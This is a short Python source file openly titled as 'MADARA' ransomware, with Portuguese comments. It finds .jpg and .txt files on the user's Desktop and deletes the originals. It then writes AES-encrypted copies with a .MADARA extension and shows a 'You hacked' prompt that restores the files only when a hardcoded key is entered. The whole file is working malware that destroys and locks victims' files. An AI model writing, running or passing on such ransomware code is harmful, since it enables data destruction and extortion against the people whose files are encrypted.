"""
RANSOMWARE MADARA
By: Cheng
"""
import os, glob, time
import pyaes
from pathlib import Path


lst_arq = ["*.jpg", "*.txt"] # Define o tipo de arquivo que será criptografado

print("Criptografando")
time.sleep(3)

# Entra no Desktop e executa a verificação
try:
    desktop = Path.home() / "Desktop"

except Exception:
    pass

os.chdir(desktop)

def encrypt():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8" # Chave de 16 bits
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando o arquivo novo no fomarto MADARA

            new_file = format_file + ".MADARA"
            new_file = open(f"{desktop}\\{new_file}", 'wb')
            new_file.write(crypto_data)
            new_file.close()


def decrypt(decrypt_file):
    try:        
        for file in glob.glob("*.MADARA"):
            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey =  keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida!')

if __name__ == '__main__':
    encrypt()
    if encrypt:
        key = input("You hacked By: Cheng, welcome to MADARA Ransomware! Say the key: ")
        if key == "1ab2c3e4f5g6h7i8":
            decrypt(key)
            for del_file in glob.glob('*.MADARA'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print("Chave de liberação inválida!!")

